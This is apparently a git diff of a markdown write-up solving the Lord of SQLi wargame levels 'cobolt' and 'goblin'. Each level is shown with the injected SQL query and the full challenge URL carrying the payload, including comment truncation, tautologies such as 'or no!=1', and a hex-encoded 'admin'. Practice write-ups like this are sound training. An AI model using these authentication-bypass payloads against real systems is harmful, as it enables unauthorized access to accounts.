@@ -23,9 +23,32 @@ query:
 ```SQL
 select id from prob_cobolt where id='admin'#' and pw=md5('')
 ```
-https://los.rubiya.kr/chall/cobolt_b876ab5595253427d3bc34f1cd8f30db.php?id=admin'%23
+https://los.rubiya.kr/chall/cobolt_b876ab5595253427d3bc34f1cd8f30db.php?id=admin%27%23
 
 ![cobolt](./pwned/cobolt.PNG)
 
 <br>
 
+## goblin
+
+![goblin](./pic/goblin.PNG)
+
+query1:
+```SQL
+select id from prob_goblin where id='guest' and no=0 or no!=1
+```
+https://los.rubiya.kr/chall/goblin_e5afb87a6716708e3af46a849517afdc.php?no=0%20or%20no!=1
+
+query2:
+```SQL
+select id from prob_goblin where id='guest' and no=0 or ord(id)=97
+```
+https://los.rubiya.kr/chall/goblin_e5afb87a6716708e3af46a849517afdc.php?no=0%20or%20ord(id)=97
+
+query3:
+```SQL
+select id from prob_goblin where id='guest' and no=0 or id=0x61646d696e
+```
+https://los.rubiya.kr/chall/goblin_e5afb87a6716708e3af46a849517afdc.php?no=0%20or%20id=0x61646d696e
+
+![cobolt](./pwned/goblin.PNG)
